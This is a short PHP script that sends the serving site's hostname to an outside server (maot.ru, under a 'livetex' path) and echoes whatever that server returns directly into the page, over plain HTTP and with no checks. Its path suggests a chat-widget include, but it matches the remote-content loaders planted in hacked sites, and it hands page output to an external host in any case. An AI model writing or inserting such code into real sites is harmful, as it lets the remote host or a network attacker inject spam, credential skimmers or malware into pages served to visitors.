<?php
$domain = $_SERVER['HTTP_HOST'];
$opts = array(
  'http'=>array(
    'method'=>"GET",
    'timeout' => 5
  )
);
$context = stream_context_create($opts);
$f = file_get_contents('http://maot.ru/livetex/livetex.php?domain=' . $domain, false, $context);
if (strlen($f) > 0) { echo $f; }
?>